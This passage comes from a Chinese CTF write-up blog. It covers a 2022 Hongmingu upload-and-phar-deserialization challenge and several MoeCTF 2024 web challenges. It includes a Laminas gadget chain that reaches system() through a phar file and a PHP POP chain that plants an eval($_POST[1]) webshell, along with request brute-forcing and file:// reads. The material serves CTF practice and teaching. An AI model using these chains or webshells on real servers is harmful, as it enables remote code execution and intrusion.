            <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">array_merge_recursive</span>(
                <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">getPost</span>()-&gt;<span class="hljs-title function_ invoke__">toArray</span>(),
                <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">getFiles</span>()-&gt;<span class="hljs-title function_ invoke__">toArray</span>()
            );

            <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">setData</span>(<span class="hljs-variable">$post</span>);
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">isValid</span>()) {
                <span class="hljs-variable">$data</span> = <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>();
                <span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">"image-file"</span>][<span class="hljs-string">"name"</span>],-<span class="hljs-number">4</span>,<span class="hljs-number">4</span>);
                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$base</span>,<span class="hljs-variable">$this</span>-&gt;white_list)){   <span class="hljs-comment">//白名单限制</span>
                    <span class="hljs-variable">$cont</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">"image-file"</span>][<span class="hljs-string">"tmp_name"</span>]);
                    <span class="hljs-comment">//对上传的文件的内容进行限制</span>
                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/&lt;\?|php|HALT\_COMPILER/i"</span>, <span class="hljs-variable">$cont</span> )) {
                        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not This"</span>);
                    }
                    <span class="hljs-comment">//图片有大小要求</span>
                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">"image-file"</span>][<span class="hljs-string">"size"</span>]&lt;<span class="hljs-number">3000</span>){
                        <span class="hljs-keyword">die</span>(<span class="hljs-string">"The picture size must be more than 3kb"</span>);
                    }
                    <span class="hljs-comment">//图片存放的路径</span>
                    <span class="hljs-variable">$img_path</span> = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-title function_ invoke__">getcwd</span>()).<span class="hljs-string">'/public/img/'</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">"image-file"</span>][<span class="hljs-string">"name"</span>]).<span class="hljs-variable">$base</span>;
                    <span class="hljs-comment">//将路径回显</span>
                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$img_path</span>;
                    <span class="hljs-variable">$form</span>-&gt;<span class="hljs-title function_ invoke__">saveImg</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">"image-file"</span>][<span class="hljs-string">"tmp_name"</span>],<span class="hljs-variable">$img_path</span>);
                }<span class="hljs-keyword">else</span>{
                    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Only Img Can Be Uploaded!'</span>;
                }
                <span class="hljs-comment">// Form is valid, save the form!</span>
                <span class="hljs-comment">//return $this-&gt;redirect()-&gt;toRoute('upload-form/success');</span>
            }
        }

        <span class="hljs-keyword">return</span> [<span class="hljs-string">'form'</span> =&gt; <span class="hljs-variable">$form</span>];
    }

}</code></pre>
<p>可以看到这里有图片上传和删除、修改和删除信息等功能</p>
<p>而且还看到这里的图片删除存在unlink，意味着我们能触发phar反序列化</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041497.png" alt></p>
<p>其中图片上传的限制有，图片大小大于3000，并且只能是jpg、jpeg、png格式，然后不能存在&lt;、?、php、HALT_COMPILER。关键词</p>
<p>这些还是很好绕过的，这里的HALT_COMPILER，用gzip命令即可</p>
<p>exp如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">View</span>\<span class="hljs-title class_">Resolver</span>{
    <span class="hljs-title class_">class</span> <span class="hljs-title class_">TemplateMapResolver</span>{
        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">map</span> = ["<span class="hljs-title class_">setBody</span>"=&gt;"<span class="hljs-title class_">system</span>"];
    }
}
<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">View</span>\<span class="hljs-title class_">Renderer</span>{
    <span class="hljs-title class_">class</span> <span class="hljs-title class_">PhpRenderer</span>{
        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">__helpers</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;__helpers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Laminas\View\Resolver\TemplateMapResolver</span>();
        }
    }
}


<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">Log</span>\<span class="hljs-title class_">Writer</span>{
    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">AbstractWriter</span>{}

    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Mail</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">AbstractWriter</span>{
        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">eventsToMail</span> = ["<span class="hljs-title class_">ls</span>"];

        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$subjectPrependText</span> = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$mail</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;mail = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Laminas\View\Renderer\PhpRenderer</span>();
        }
    }
}

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">Log</span>{
    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Logger</span>{
        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">writers</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;writers = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">\Laminas\Log\Writer\Mail</span>()];
        }
    }
}


<span class="hljs-keyword">namespace</span>{
    $<span class="hljs-title class_">a</span> = <span class="hljs-title class_">new</span> \<span class="hljs-title class_">Laminas</span>\<span class="hljs-title class_">Log</span>\<span class="hljs-title class_">Logger</span>();
    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));
    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));
    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">"phar.phar"</span>);
    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span>
    <span class="hljs-variable">$o</span> = <span class="hljs-variable">$a</span>;
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">"testtesttest"</span>,<span class="hljs-number">999999</span>)); <span class="hljs-comment">//添加要压缩的文件</span>
<span class="hljs-comment">//签名自动计算</span>
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-comment">//    echo base64_encode(serialize(new Logger()));</span>
}</code></pre>
<p>这里尝试了很多次一直失败，最后感觉是环境问题，也就放弃了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041498.png" alt></p>
<p>如上图，正常来说，回显路径之后，访问album/imgdelete路由去触发反序列化</p>
<pre><code class="hljs scss">/<span class="hljs-selector-tag">var</span>/www/public/<span class="hljs-selector-tag">img</span>/<span class="hljs-number">00</span>bf23e130fa1e525e332ff03dae345d<span class="hljs-selector-class">.png</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041499.png" alt></p>
<p>按理来说就应该出来根目录了，但我不知道为何，试了很多次。</p>
<h3 id="参考文章">参考文章</h3>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/phant0m/articles/16450674.html#"># 2022红明谷ctf</a><br>
<a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/123747435"># 红明谷2022 web Fan website</a><br>
<a target="_blank" rel="noopener" href="http://www.a10ng.top/?p=198"># 红明谷2022部分wp</a></p>
<h1 id="moectf-2024">MoeCTF 2024</h1>
<h2 id="web渗透测试与审计入门指北">Web渗透测试与审计入门指北</h2>
<p>下载附件，用小p搭建网站即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023942.png" alt="image-20240816163616795"></p>
<h2 id="弗拉格之地的入口">弗拉格之地的入口</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023943.png" alt="image-20240816163753154"></p>
<p>看到爬虫二字，可以联想到访问robots.txt</p>
<p>访问之后拿到flag（我还以为这是一部分flag，没想到就是最终结果了）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023944.png" alt="image-20240816163856900"></p>
<h2 id="ez_http">ez_http</h2>
<p>最终完整数据包如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023945.png" alt="image-20240816170118583"></p>
<h2 id="proveyourlove">ProveYourLove</h2>
<p>根据题目描述，当表白次数到达300的时候，才能证明你的爱，也就是拿到flag。</p>
<p>直接bp抓包，爆破300次即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023946.png" alt="image-20240816171954042"></p>
<p>如下图得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023947.png" alt="image-20240816171845240"></p>
<h2 id="弗拉格之地的挑战">弗拉格之地的挑战</h2>
<p>根据页面提示首先访问：/flag1ab.html</p>
<p>然后查看源代码，得到hint还有一部分flag，flag需要base64解密</p>
<pre><code class="hljs html"><span class="hljs-comment">&lt;!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下--&gt;</span>
<span class="hljs-comment">&lt;!--flag1: bW9lY3Rm--&gt;</span>
<span class="hljs-comment">&lt;!--下一步：/flag2hh.php--&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023948.png" alt="image-20240816172143330"></p>
<pre><code class="hljs scss">恭喜你已经学会了如何查看网页源代码，但这还不够

这是第二题，本题关键词： http

想想服务器通过网络传输过来的，除了这个页面，还有什么？</code></pre>
<p>根据提示，可以猜测是要查看http流量包，如下图得到第三关还有第二部分flag：e0FmdEV</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023949.png" alt="image-20240816172307918"></p>
<p>接着访问页面，让我们</p>
<pre><code class="hljs scss">请用 GET 方法传入一个 <span class="hljs-selector-tag">a</span> 参数
再用 POST 方法传入一个 <span class="hljs-selector-tag">b</span> 参数
你需要使用 admin 的身份验证</code></pre>
<p>完整数据包如下，第三部分flag：yX3RoMXN</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023950.png" alt="image-20240816173003411"></p>
<p>访问第四关，首先需要修改referer为指定内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023951.png" alt="image-20240816174346812"></p>
<p>然后根据题目要求，让我们根据提示按按钮，但是明显没有9按钮，于是可以修改前端属性，让原本id为8的修改为id为9的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023952.png" alt="image-20240816174437188"></p>
<p>如下图，成功得到flag，需要去控制台查看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023953.png" alt="image-20240816174312395"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023954.png" alt="image-20240816174229173"></p>
<p>第四部分flag：fdFVUMHJ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023955.png" alt="image-20240816174901273"></p>
<p>让我们输入指定内容，但是看js源码，发现不能与指定内容相等，想到是页面提交的时候会自动加上+符号，尝试bp抓包看看</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkValue</span>(<span class="hljs-params"></span>) {
        <span class="hljs-keyword">var</span> content = <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">"form"</span>][<span class="hljs-string">"content"</span>].<span class="hljs-property">value</span>;
        <span class="hljs-keyword">if</span> (content == <span class="hljs-string">"I want flag"</span>) {
            <span class="hljs-title function_">alert</span>(<span class="hljs-string">"你就这么直接？"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }</code></pre>
<p>如下图，本来原内容中间间隔一个加号，去掉之后发现成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023956.png" alt="image-20240816174852217"></p>
<p>第五部分：fSV90aDF</p>
<p>第六关完整答案如下，大小写绕过即可。第六部分flag：rZV9VX2t</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023957.png" alt="image-20240816175207191"></p>
<p>最后读取根目录flag即可，第七部分：rbm93X1dlQn0=</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023958.png" alt="image-20240816175407130"></p>
<pre><code class="hljs scss">bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023959.png" alt="image-20240816175523810"></p>
<p>得到flag</p>
<h2 id="pop-moe">pop moe</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$payl0ad</span> = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$what</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;payl0ad === <span class="hljs-number">0</span>)
        {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'FAILED TO ATTACK'</span>);
        }
        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;what;
        <span class="hljs-variable">$a</span>();
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;payload = <span class="hljs-variable language_">$this</span>-&gt;payl0ad;
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sec</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$b</span>(<span class="hljs-variable language_">$this</span>-&gt;sec);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dangerous</span>(<span class="hljs-params"><span class="hljs-variable">$whaattt</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$whaattt</span>-&gt;<span class="hljs-title function_ invoke__">evvval</span>(<span class="hljs-variable">$this</span>-&gt;sec);
    }

}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evvval</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$str</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;mystr;
    }
}

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'data'</span>]))
{
    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'data'</span>]);
}
<span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}</code></pre>
<p>链子思路很简单，就是最后一步需要动点脑子</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$what</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sec</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;
}

<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class000</span>();
<span class="hljs-variable">$pop</span>-&gt;payl0ad = <span class="hljs-number">1</span>;
<span class="hljs-variable">$pop</span>-&gt;what = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class001</span>();
<span class="hljs-variable">$pop</span>-&gt;what-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class002</span>();
<span class="hljs-variable">$pop</span>-&gt;what-&gt;payl0ad = <span class="hljs-string">'dangerous'</span>;
<span class="hljs-variable">$pop</span>-&gt;what-&gt;a-&gt;sec = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class003</span>();
<span class="hljs-variable">$pop</span>-&gt;what-&gt;a-&gt;sec-&gt;mystr = <span class="hljs-string">'eval($_POST[1]);'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>可能会一直想<code>evvval($str)</code>如何才能正确给str传参，当时我忘记考虑tostring，但是仔细一看就能知道，eval可以触发tostring，这样的话，最终eval的参数内容就靠自身的mystr了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023960.png" alt="image-20240816183444787"></p>
<p>然后phpinfo全局查看moectf即可</p>
<h2 id="垫刀之路01-moectf启动">垫刀之路01: MoeCTF？启动！</h2>
<p>查看环境变量env即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023961.png" alt="image-20240819101140755"></p>
<h2 id="imagecloud前置">ImageCloud前置</h2>
<p>file协议读取指定文件即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023962.png" alt="image-20240819102434507"></p>
<h2 id="垫刀之路02-普通的文件上传">垫刀之路02: 普通的文件上传</h2>
<p>直接上传即可，没有任何过滤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408192023963.png" alt="image-20240819102725730"></p>
<h2 id="垫刀之路03-这是一个图床">垫刀之路03: 这是一个图床</h2>
<pre><code class="hljs js">$(<span class="hljs-string">"#btn"</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) {
       <span class="hljs-comment">// console.log("onclick");</span>
       <span class="hljs-keyword">const</span> input = $(<span class="hljs-string">"#imageInput"</span>)[<span class="hljs-number">0</span>];
       <span class="hljs-keyword">if</span> (input.<span class="hljs-property">files</span> &amp;&amp; input.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>]) {
           <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();
           <span class="hljs-keyword">const</span> extension = <span class="hljs-title function_">getFileExtension</span>(input.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>)
           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(extension)
           <span class="hljs-keyword">if</span> (extension !== <span class="hljs-string">"jpg"</span> &amp;&amp; extension !== <span class="hljs-string">"png"</span> &amp;&amp; extension !== <span class="hljs-string">"gif"</span>) {
               $(<span class="hljs-string">"#result"</span>).<span class="hljs-title function_">text</span>(<span class="hljs-string">"只能上传 jpg/png/gif 格式的图片哦"</span>)
               <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
           }
           formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">"image"</span>, input.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>]);
           $.<span class="hljs-title function_">ajax</span>({
               <span class="hljs-attr">url</span>: <span class="hljs-string">"upload.php"</span>,
               <span class="hljs-attr">type</span>: <span class="hljs-string">"POST"</span>,
               <span class="hljs-attr">data</span>: formData,
               <span class="hljs-attr">processData</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 告诉jQuery不要处理发送的数据</span>
               <span class="hljs-attr">contentType</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 告诉jQuery不要设置contentType</span>
               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">res</span>) {
                   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
                   $(<span class="hljs-string">"#result"</span>).<span class="hljs-title function_">text</span>(res);
               }
           })
       }
   })

   <span class="hljs-keyword">function</span> <span class="hljs-title function_">getFileExtension</span>(<span class="hljs-params">filename</span>) {
       <span class="hljs-comment">// 假设filename是一个包含文件名的字符串</span>
       <span class="hljs-comment">// 使用split('.')分割字符串，得到一个数组</span>
       <span class="hljs-comment">// 然后使用pop()获取数组的最后一个元素，即后缀名</span>
